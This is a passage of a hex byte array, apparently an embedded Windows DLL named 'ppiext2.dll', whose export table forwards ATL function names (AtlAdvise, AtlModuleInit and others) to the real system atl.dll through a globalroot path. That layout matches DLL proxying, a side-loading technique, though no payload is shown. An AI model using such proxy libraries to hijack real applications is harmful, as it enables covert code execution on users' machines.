	0x16, 0x00, 0x03, 0x00, 0x21, 0x00, 0x30, 0x00, 0x22, 0x00, 0x05, 0x00, 0x06, 0x00, 0x2E, 0x00,
	0x07, 0x00, 0x08, 0x00, 0x09, 0x00, 0x24, 0x00, 0x23, 0x00, 0x0A, 0x00, 0x0B, 0x00, 0x2D, 0x00,
	0x0C, 0x00, 0x2F, 0x00, 0x0D, 0x00, 0x12, 0x00, 0x27, 0x00, 0x0F, 0x00, 0x31, 0x00, 0x01, 0x00,
	0x04, 0x00, 0x0E, 0x00, 0x33, 0x00, 0x34, 0x00, 0x35, 0x00, 0x36, 0x00, 0x37, 0x00, 0x38, 0x00,
	0x39, 0x00, 0x3A, 0x00, 0x3B, 0x00, 0x3C, 0x00, 0x3D, 0x00, 0x3E, 0x00, 0x3F, 0x00, 0x40, 0x00,
	0x41, 0x00, 0x42, 0x00, 0x43, 0x00, 0x44, 0x00, 0x45, 0x00, 0x46, 0x00, 0x47, 0x00, 0x48, 0x00,
	0x49, 0x00, 0x4A, 0x00, 0x4B, 0x00, 0x17, 0x00, 0x4C, 0x00, 0x4D, 0x00, 0x4E, 0x00, 0x4F, 0x00,
	0x50, 0x00, 0x51, 0x00, 0x52, 0x00, 0x53, 0x00, 0x54, 0x00, 0x55, 0x00, 0x56, 0x00, 0x4F, 0x01,
	0x57, 0x00, 0x58, 0x00, 0x59, 0x00, 0x5A, 0x00, 0x5B, 0x00, 0x5C, 0x00, 0x5D, 0x00, 0x5E, 0x00,
	0x5F, 0x00, 0x60, 0x00, 0x61, 0x00, 0x62, 0x00, 0x63, 0x00, 0x64, 0x00, 0x65, 0x00, 0x66, 0x00,
	0x67, 0x00, 0x68, 0x00, 0x69, 0x00, 0x6A, 0x00, 0x6B, 0x00, 0x6C, 0x00, 0x6D, 0x00, 0x6E, 0x00,
	0x6F, 0x00, 0x70, 0x00, 0x71, 0x00, 0x72, 0x00, 0x73, 0x00, 0x74, 0x00, 0x75, 0x00, 0x76, 0x00,
	0x77, 0x00, 0x78, 0x00, 0x79, 0x00, 0x7A, 0x00, 0x7B, 0x00, 0x7C, 0x00, 0x7D, 0x00, 0x7E, 0x00,
	0x7F, 0x00, 0x80, 0x00, 0x81, 0x00, 0x82, 0x00, 0x83, 0x00, 0x84, 0x00, 0x85, 0x00, 0x86, 0x00,
	0x87, 0x00, 0x88, 0x00, 0x70, 0x70, 0x69, 0x65, 0x78, 0x74, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00,
	0x41, 0x74, 0x6C, 0x41, 0x64, 0x76, 0x69, 0x73, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C,
	0x2E, 0x41, 0x74, 0x6C, 0x41, 0x64, 0x76, 0x69, 0x73, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78,
	0x41, 0x74, 0x74, 0x61, 0x63, 0x68, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x41, 0x74, 0x74, 0x61, 0x63, 0x68,
	0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65,
	0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74,
	0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E,
	0x74, 0x72, 0x6F, 0x6C, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65,
	0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x45, 0x78, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C,
	0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x74,
	0x72, 0x6F, 0x6C, 0x45, 0x78, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74,
	0x65, 0x44, 0x69, 0x61, 0x6C, 0x6F, 0x67, 0x41, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E,
	0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x69, 0x61, 0x6C, 0x6F,
	0x67, 0x41, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x69,
	0x61, 0x6C, 0x6F, 0x67, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x41, 0x78, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x69, 0x61, 0x6C, 0x6F, 0x67, 0x57, 0x00,
	0x41, 0x74, 0x6C, 0x41, 0x78, 0x44, 0x69, 0x61, 0x6C, 0x6F, 0x67, 0x42, 0x6F, 0x78, 0x41, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x44, 0x69, 0x61, 0x6C,
	0x6F, 0x67, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x44, 0x69, 0x61, 0x6C,
	0x6F, 0x67, 0x42, 0x6F, 0x78, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74,
	0x6C, 0x41, 0x78, 0x44, 0x69, 0x61, 0x6C, 0x6F, 0x67, 0x42, 0x6F, 0x78, 0x57, 0x00, 0x41, 0x74,
	0x6C, 0x41, 0x78, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6E,
	0x74, 0x72, 0x6F, 0x6C, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x47, 0x65, 0x74, 0x48, 0x6F, 0x73,
	0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x47, 0x65,
	0x74, 0x48, 0x6F, 0x73, 0x74, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x57, 0x69, 0x6E, 0x49, 0x6E,
	0x69, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x57,
	0x69, 0x6E, 0x49, 0x6E, 0x69, 0x74, 0x00, 0x41, 0x74, 0x6C, 0x43, 0x6F, 0x6D, 0x50, 0x74, 0x72,
	0x41, 0x73, 0x73, 0x69, 0x67, 0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74,
	0x6C, 0x43, 0x6F, 0x6D, 0x50, 0x74, 0x72, 0x41, 0x73, 0x73, 0x69, 0x67, 0x6E, 0x00, 0x41, 0x74,
	0x6C, 0x43, 0x6F, 0x6D, 0x51, 0x49, 0x50, 0x74, 0x72, 0x41, 0x73, 0x73, 0x69, 0x67, 0x6E, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x43, 0x6F, 0x6D, 0x51, 0x49, 0x50,
	0x74, 0x72, 0x41, 0x73, 0x73, 0x69, 0x67, 0x6E, 0x00, 0x41, 0x74, 0x6C, 0x43, 0x72, 0x65, 0x61,
	0x74, 0x65, 0x54, 0x61, 0x72, 0x67, 0x65, 0x74, 0x44, 0x43, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74,
	0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x61, 0x72, 0x67, 0x65,
	0x74, 0x44, 0x43, 0x00, 0x41, 0x74, 0x6C, 0x44, 0x65, 0x76, 0x4D, 0x6F, 0x64, 0x65, 0x57, 0x32,
	0x41, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x44, 0x65, 0x76, 0x4D,
	0x6F, 0x64, 0x65, 0x57, 0x32, 0x41, 0x00, 0x41, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x4D, 0x61,
	0x72, 0x73, 0x68, 0x61, 0x6C, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61,
	0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x4D, 0x61, 0x72, 0x73, 0x68, 0x61,
	0x6C, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x00, 0x41, 0x74, 0x6C, 0x47, 0x65, 0x74, 0x4F, 0x62,
	0x6A, 0x65, 0x63, 0x74, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x66,
	0x61, 0x63, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x47, 0x65,
	0x74, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x49, 0x6E, 0x74,
	0x65, 0x72, 0x66, 0x61, 0x63, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x47, 0x65, 0x74, 0x56, 0x65, 0x72,
	0x73, 0x69, 0x6F, 0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x47,
	0x65, 0x74, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x00, 0x41, 0x74, 0x6C, 0x48, 0x69, 0x4D,
	0x65, 0x74, 0x72, 0x69, 0x63, 0x54, 0x6F, 0x50, 0x69, 0x78, 0x65, 0x6C, 0x00, 0x5C, 0x5C, 0x3F,
	0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C,
	0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x48, 0x69, 0x4D, 0x65, 0x74, 0x72, 0x69, 0x63, 0x54,
	0x6F, 0x50, 0x69, 0x78, 0x65, 0x6C, 0x00, 0x41, 0x74, 0x6C, 0x49, 0x50, 0x65, 0x72, 0x73, 0x69,
	0x73, 0x74, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x42, 0x61, 0x67, 0x5F, 0x4C, 0x6F,
	0x61, 0x64, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x49, 0x50, 0x65,
	0x72, 0x73, 0x69, 0x73, 0x74, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x42, 0x61, 0x67,
	0x5F, 0x4C, 0x6F, 0x61, 0x64, 0x00, 0x41, 0x74, 0x6C, 0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73,
	0x74, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x42, 0x61, 0x67, 0x5F, 0x53, 0x61, 0x76,
	0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x49, 0x50, 0x65, 0x72,
	0x73, 0x69, 0x73, 0x74, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x42, 0x61, 0x67, 0x5F,
	0x53, 0x61, 0x76, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74,
	0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x49, 0x6E, 0x69, 0x74, 0x5F, 0x47, 0x65, 0x74, 0x53, 0x69,
	0x7A, 0x65, 0x4D, 0x61, 0x78, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x49, 0x6E,
	0x69, 0x74, 0x5F, 0x47, 0x65, 0x74, 0x53, 0x69, 0x7A, 0x65, 0x4D, 0x61, 0x78, 0x00, 0x41, 0x74,
	0x6C, 0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x49,
	0x6E, 0x69, 0x74, 0x5F, 0x4C, 0x6F, 0x61, 0x64, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E,
	0x41, 0x74, 0x6C, 0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61,
	0x6D, 0x49, 0x6E, 0x69, 0x74, 0x5F, 0x4C, 0x6F, 0x61, 0x64, 0x00, 0x41, 0x74, 0x6C, 0x49, 0x50,
	0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x49, 0x6E, 0x69, 0x74,
	0x5F, 0x53, 0x61, 0x76, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x49, 0x6E,
	0x69, 0x74, 0x5F, 0x53, 0x61, 0x76, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x49, 0x6E, 0x74, 0x65, 0x72,
	0x6E, 0x61, 0x6C, 0x51, 0x75, 0x65, 0x72, 0x79, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x66, 0x61, 0x63,
	0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x49, 0x6E, 0x74, 0x65,
	0x72, 0x6E, 0x61, 0x6C, 0x51, 0x75, 0x65, 0x72, 0x79, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x66, 0x61,
	0x63, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x61, 0x72, 0x73, 0x68, 0x61, 0x6C, 0x50, 0x74, 0x72,
	0x49, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74,
	0x6C, 0x4D, 0x61, 0x72, 0x73, 0x68, 0x61, 0x6C, 0x50, 0x74, 0x72, 0x49, 0x6E, 0x50, 0x72, 0x6F,
	0x63, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x41, 0x64, 0x64, 0x43, 0x72,
	0x65, 0x61, 0x74, 0x65, 0x57, 0x6E, 0x64, 0x44, 0x61, 0x74, 0x61, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61,
	0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x41, 0x64, 0x64, 0x43,
	0x72, 0x65, 0x61, 0x74, 0x65, 0x57, 0x6E, 0x64, 0x44, 0x61, 0x74, 0x61, 0x00, 0x41, 0x74, 0x6C,
	0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x41, 0x64, 0x64, 0x54, 0x65, 0x72, 0x6D, 0x46, 0x75, 0x6E,
	0x63, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75,
	0x6C, 0x65, 0x41, 0x64, 0x64, 0x54, 0x65, 0x72, 0x6D, 0x46, 0x75, 0x6E, 0x63, 0x00, 0x41, 0x74,
	0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x45, 0x78, 0x74, 0x72, 0x61, 0x63, 0x74, 0x43, 0x72,
	0x65, 0x61, 0x74, 0x65, 0x57, 0x6E, 0x64, 0x44, 0x61, 0x74, 0x61, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61,
	0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x45, 0x78, 0x74, 0x72,
	0x61, 0x63, 0x74, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x57, 0x6E, 0x64, 0x44, 0x61, 0x74, 0x61,
	0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x47, 0x65, 0x74, 0x43, 0x6C, 0x61,
	0x73, 0x73, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E,
	0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x47, 0x65, 0x74, 0x43, 0x6C, 0x61, 0x73,
	0x73, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C,
	0x65, 0x49, 0x6E, 0x69, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x49, 0x6E, 0x69, 0x74, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F,
	0x64, 0x75, 0x6C, 0x65, 0x4C, 0x6F, 0x61, 0x64, 0x54, 0x79, 0x70, 0x65, 0x4C, 0x69, 0x62, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65,
